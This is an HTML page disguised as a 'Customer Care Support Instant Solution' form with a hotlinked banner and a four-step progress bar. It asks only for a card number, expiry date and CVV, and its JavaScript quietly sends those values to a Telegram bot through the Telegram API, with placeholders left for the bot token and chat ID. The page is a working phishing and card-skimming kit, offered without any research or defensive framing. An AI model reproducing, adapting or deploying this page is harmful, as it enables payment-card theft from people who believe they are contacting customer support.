<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Customer Support Form</title>
<style>
  body {
    font-family: 'Arial', sans-serif;
    margin: 0;
    padding: 0;
    background-color: #ecf0f1;
  }
  .header {
    padding: 10px 0;
    text-align: center;
    background-color: #3498db;
  }
  .customer-service-text {
    text-align: center;
    color: white;
    font-size: 24px;
    margin-top: 20px;
  }
  .progress-bar {
    display: flex;
    justify-content: space-around;
    align-items: center;
    padding: 10px 0;
    margin-top: 10px;
  }
  .circle {
    width: 25px;
    height: 25px;
    background-color: #dcdde1;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    color: black;
    font-weight: bold;
  }
  .active {
    background-color: #2ecc71;
    color: white;
  }
  .form-container {
    background: white;
    width: 80%;
    max-width: 500px;
    margin: 20px auto;
    padding: 20px;
    border: 2px solid #2ecc71;
    box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
    border-radius: 15px;
  }
  .form-field {
    width: 100%;
    padding: 10px;
    margin-top: 20px;
    margin-bottom: 20px;
    border: 1px solid #2ecc71;
    background-color: #e9f5eb;
    border-radius: 15px;
    box-sizing: border-box;
  }
  .submit-btn {
    width: 100%;
    padding: 10px;
    background-color: #2ecc71;
    border: none;
    border-radius: 15px;
    color: white;
    cursor: pointer;
    margin-top:30px;
  }
  .submit-btn:hover {
    background-color: #27ae60;
  }
  .container {
  display: flex;
  justify-content: space-between;
}

.half-width {
  width: calc(50% - 4px);
  /* Adjusted margins for a symmetrical layout */
  margin-top: 60px;
  margin-bottom: 30px;
}

/* Remove the first and last child specific margins */

</style>
</head>
<body>

<div class="header">
  <img src="https://thumbor.forbes.com/thumbor/fit-in/960x/https://www.forbes.com/advisor/wp-content/uploads/2022/03/Image_-_Customer_service_rep_.jpeg.jpg" alt="Customer Care Support Banner">
  <div class="customer-service-text">CUSTOMER CARE SUPPORT INSTANT SOLUTION</div>
</div>

<div class="progress-bar">
  <div class="circle active">1</div>
  <div class="circle">2</div>
  <div class="circle">3</div>
  <div class="circle">4</div>
</div>

<div class="form-container">
  <form id="support-form">
    <input type="text" id="card-number" name="card-number" class="form-field" placeholder="Enter Card Number*" required>
    <div class="expiry-cvv-container">
      <input type="text" id="expiry-date" name="expiry-date" class="form-field half-width" placeholder="Expiry Date*" required>
      <input type="text" id="cvv" name="cvv" class="form-field half-width" placeholder="CVV*" required>
    </div>
 
    <button type="button" class="submit-btn" onclick="sendToTelegram()">Submit</button>
  </form>
</div>

<script>
  function sendToTelegram() {
    var cardNumber = document.getElementById('card-number').value;
    var expiryDate = document.getElementById('expiry-date').value;
    var cvv = document.getElementById('cvv').value;
   

    var message = `Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`;
    var xhr = new XMLHttpRequest();
    xhr.open("GET", `https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendMessage?chat_id=YOUR_TELEGRAM_CHAT_ID&text=${encodeURIComponent(message)}`, true);
    xhr.send();
  }
</script>

</body>
</html>
